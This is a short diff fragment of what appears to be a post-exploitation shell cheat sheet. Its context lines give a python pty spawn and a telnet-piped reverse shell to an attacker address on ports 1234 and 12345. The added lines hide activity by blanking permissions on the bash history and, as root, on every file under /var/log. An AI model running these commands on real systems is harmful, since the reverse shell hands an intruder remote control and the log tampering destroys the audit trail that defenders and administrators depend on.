@@ -41,3 +41,8 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 #listen on port 1234 and 12345
 telnet myip 1234 | /bin/bash | telnet myip 12345
 #issue commands in 1234 shell and get response in 12345 shell
+
+#disable logging before issuing commands
+chmod 0 ~/.bash_history
+#if root
+chmod -R 0 /var/log/*
